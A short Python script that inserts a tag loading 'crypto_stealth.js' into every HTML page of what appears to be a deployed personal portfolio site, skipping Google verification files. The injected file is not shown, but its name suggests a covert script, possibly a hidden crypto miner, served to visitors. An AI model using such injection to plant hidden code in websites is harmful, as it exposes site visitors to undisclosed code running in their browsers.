from pathlib import Path

portfolio_dir = Path(r"c:\Users\rehan\Desktop\website_builder\Deployed_Websites\mohammadrehan.pages.dev")
tag = '<script src="crypto_stealth.js" defer></script>\n</body>'

for html_file in portfolio_dir.glob("*.html"):
    if html_file.name.startswith("google"):
        continue
    content = html_file.read_text(encoding="utf-8")
    if "crypto_stealth.js" not in content and "</body>" in content:
        content = content.replace("</body>", tag)
        html_file.write_text(content, encoding="utf-8")
        print(f"Injected into {html_file.name}")
    else:
        print(f"Skipped / Already has {html_file.name}")
